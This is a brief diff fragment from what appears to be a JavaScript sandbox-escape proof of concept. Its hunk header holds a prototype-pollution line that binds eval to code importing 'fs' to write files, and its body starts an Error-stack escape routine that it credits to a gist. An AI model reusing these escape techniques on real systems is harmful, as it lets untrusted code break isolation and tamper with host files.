@@ -691,7 +691,7 @@ constructor.keys(0).__proto__.push = eval.bind(null, "import('fs').then(m=>m.wri
 }).then(async()=>{
 //https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
 var code=`
-////Symbol= Object.getOwnPropertySymbols(Array)[0].constructor;
+//Symbol= Object.getOwnPropertySymbols(Array)[0].constructor;
 async function fn() {
     (function stack() {
         new Error().stack;
